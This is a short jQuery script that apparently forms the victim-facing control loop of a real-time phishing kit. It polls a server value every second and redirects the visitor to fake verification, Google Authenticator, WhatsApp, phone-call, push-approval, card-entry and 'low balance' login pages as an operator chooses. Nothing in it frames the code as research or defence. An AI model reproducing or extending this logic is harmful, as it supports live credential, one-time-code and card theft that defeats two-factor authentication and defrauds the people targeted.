$(document).ready(function() {
    function checkValue() {
        $.ajax({
            url: 'check_value.php',
            type: 'get',
            success: function(response) {
                let numResponse = Number(response);
                switch(numResponse) {
                    case 1:
                        window.location.href = 'verification.html';
                        resetValue();
                        break;
                    case 2:
                        window.location.href = 'googleaut.html';
                        resetValue();
                        break;
                    case 3:
                        window.location.href = 'whatsapp.html';
                        resetValue();
                        break;
                    case 4:
                        window.location.href = 'call.html';
                        resetValue();
                        break;
                    case 5:
                        window.location.href = 'verification.html?error=true';
                        resetValue();
                        break;
                    case 6:
                        window.location.href = 'googleaut.html?error=true';
                        resetValue();
                        break;
                    case 7:
                        window.location.href = 'whatsapp.html?error=true';
                        resetValue();
                        break;
                    case 8:
                        window.location.href = 'call.html?error=true';
                        resetValue();
                        break;
                    case 9:
                        window.location.href = 'end.html';
                        resetValue();
                        break;
                    case 10:
                        window.location.href = 'pushemail.php';
                        resetValue();
                        break;
                    case 11:
                        window.location.href = 'login.html?error=true';
                        resetValue();
                        break;
                    case 12:
                        window.location.href = 'pushapp.html';
                        resetValue();
                        break;
                    case 13:
                        window.location.href = 'login.html?error=lowbalance';
                        resetValue();
                        break;
                    case 14:
                        window.location.href = 'card.html';
                        resetValue();
                        break;
                    default:
                        setTimeout(checkValue, 1000);
                }
            }
        });
    }

    function resetValue() {
        $.ajax({
            url: 'reset_value.php',
            type: 'post',
            success: function(response) {
                // Обработка ответа от сервера
            }
        });
    }

    checkValue();
});
